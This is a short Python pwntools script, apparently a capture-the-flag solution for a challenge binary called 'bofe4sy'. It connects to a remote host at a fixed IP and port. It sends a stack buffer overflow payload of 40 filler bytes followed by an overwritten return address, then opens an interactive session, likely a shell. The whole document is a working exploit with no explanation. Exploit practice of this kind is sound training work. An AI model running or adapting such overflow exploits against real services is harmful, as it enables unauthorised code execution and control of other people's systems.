from pwn import *
#r = process('./bofe4sy')
r = remote('140.110.112.31', 2121)
addr = p64(0x400647)
payload = 'a' * 40 + addr
r.recvuntil('input:')
r.send(payload)
r.interactive()
